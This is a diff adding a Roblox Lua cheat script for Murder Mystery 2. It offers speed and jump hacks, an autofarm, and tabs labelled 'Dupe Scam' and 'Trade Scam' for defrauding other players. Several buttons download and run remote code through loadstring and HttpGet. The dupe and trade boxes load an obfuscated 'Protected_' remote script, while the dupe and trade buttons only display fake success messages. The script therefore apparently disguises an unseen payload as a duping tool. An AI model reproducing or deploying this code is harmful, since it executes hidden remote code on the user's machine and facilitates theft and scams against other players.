@@ -1,0 +1,173 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+ local Window = OrionLib:MakeWindow({Name = "🎅🏻 SaintaScripts | Murder Mystery 2 🔪", HidePremium = false, IntroText = "SaintaScripts", SaveConfig = true, ConfigFolder = "OrionTest"})
+ 
+ local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Player"
+})
+
+Tab:AddSlider({
+	Name = "WalkSpeed",
+	Min = 16,
+	Max = 250,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Speed",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end    
+})
+
+Tab:AddSlider({
+	Name = "JumpPower",
+	Min = 50,
+	Max = 275,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Jump Height",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+	end    
+})
+
+Tab:AddButton({
+	Name = "Shiftlock",
+	Callback = function()
+      		loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Farm"
+	
+})
+
+Tab:AddButton({
+	Name = "Autofarm",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua"))()
+	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Scam",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+local Section = Tab:AddSection({
+	Name = "Dupe Scam"
+	
+})
+	
+Tab:AddToggle({
+	Name = "Enable Duping",
+	Default = false,
+	Callback = function(Value)
+		      		OrionLib:MakeNotification({
+	Name = "Saintful Sinners | Dupe",
+	Content = "Duping Enabled",
+	Image = "rbxassetid://4483345998",
+	Time = 3
+	})
+	end    
+})
+
+Tab:AddTextbox({
+	Name = "Item You Wanna Dupe",
+	Default = "Weapon Name",
+	TextDisappear = false,
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_60cd0c4fd25fdedfd5a7b382.lua"))()
+
+	end	  
+})
+
+Tab:AddButton({
+	Name = "Dupe Item",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Saintful Sinners | Dupe",
+	Content = "Items Duped! (if not wait 2-5 mins)",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
+
+  	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Trade Scam"
+	
+})
+
+Tab:AddToggle({
+	Name = "Enable Trade Scam",
+	Default = false,
+	Callback = function(Value)
+		      		OrionLib:MakeNotification({
+	Name = "Saintful Sinners | Trade Scam",
+	Content = "Trade Scam Enabled",
+	Image = "rbxassetid://4483345998",
+	Time = 3
+	})
+	end    
+})
+
+Tab:AddTextbox({
+	Name = "Person You Wanna Trade",
+	Default = "Username",
+	TextDisappear = false,
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_60cd0c4fd25fdedfd5a7b382.lua"))()
+
+	end	  
+})
+
+Tab:AddButton({
+	Name = "Force Trade",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Saintful Sinners | Trade Scam",
+	Content = "Starting Trade (Loading...)",
+	Image = "rbxassetid://4483345998",
+	Time = 7
+})
+
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddParagraph("YouTube","YouTube : SuperSpookyScripts")
+Tab:AddParagraph("Discord","Discord : .sainta.")
+
+local Section = Tab:AddSection({
+	Name = "Support"
+
+})
+
+	Tab:AddButton({
+	Name = "Support / Help",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Saintful Sinners | Support",
+	Content = "discord.gg/u9rUsJkK9u",
+	Image = "rbxassetid://4483345998",
+	Time = 30
+})
+
+  	end    
+})
